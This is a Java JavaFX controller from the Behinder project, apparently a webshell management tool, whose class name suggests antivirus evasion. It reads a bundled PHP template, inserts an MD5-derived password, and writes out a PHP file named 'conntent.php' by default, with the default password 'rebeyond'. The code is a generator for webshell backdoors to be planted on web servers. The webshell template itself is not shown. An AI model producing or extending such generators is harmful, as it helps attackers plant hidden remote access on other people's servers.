package net.rebeyond.behinder.ui.controller;

import javafx.fxml.FXML;
import javafx.scene.control.Alert;
import javafx.scene.control.TextField;
import javafx.stage.FileChooser;
import javafx.stage.Stage;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.security.MessageDigest;

public class MainMianshaController {

    @FXML
    private TextField mima;

    @FXML
    private void onGenerate() {
        FileChooser fileChooser = new FileChooser();
        fileChooser.setTitle("保存文件");
        String currentDir = System.getProperty("user.dir");
        fileChooser.setInitialDirectory(new File(currentDir));
        fileChooser.getExtensionFilters().addAll(
                new FileChooser.ExtensionFilter("所有文件", "*.*"),
                new FileChooser.ExtensionFilter("php", "*.php"));
        // 设置默认文件名
        fileChooser.setInitialFileName("conntent.php");

        // 弹出保存窗口
        File file = fileChooser.showSaveDialog(getStage());
        if (file != null) {
            try {
                InputStream inputStream = getClass().getResourceAsStream("/net/rebeyond/behinder/ui/php.php");

                ByteArrayOutputStream buffer = new ByteArrayOutputStream();
                byte[] temp = new byte[1024];
                int bytesRead;
                while ((bytesRead = inputStream.read(temp)) != -1) {
                    buffer.write(temp, 0, bytesRead);
                }

                byte[] content = buffer.toByteArray();
                String template = new String(content, StandardCharsets.UTF_8);
                String password = mima.getText();

                if (password == null || password.trim().isEmpty()) {
                    showAlert("您未输入密码", "默认密码为rebeyond");
                    password = "rebeyond";

                }
                String md5pass16 = String.valueOf(getMD5Prefix16(password));
                String result = template.replace("<<<PASSWORD>>>", md5pass16.substring(0, 16));
                Files.write(file.toPath(), result.getBytes());
                showAlert("成功", "文件已保存到:" + file.getAbsolutePath()+"\n"+"密码为:"+password);

            } catch (Exception e) {
                showAlert("错误", "保存失败: " + e.getMessage());
            }
        }
    }
    private static StringBuilder getMD5Prefix16(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] digest = md.digest(input.getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder();
            for (byte b : digest) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) hexString.append('0');
                hexString.append(hex);
            }
            return hexString;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
    private void showAlert(String title, String message) {
        Alert alert = new Alert(Alert.AlertType.INFORMATION);
        alert.setTitle(title);
        alert.setHeaderText(null);
        alert.setContentText(message);
        alert.showAndWait();
    }

    private Stage getStage() {
        return (Stage) mima.getScene().getWindow();
    }
}
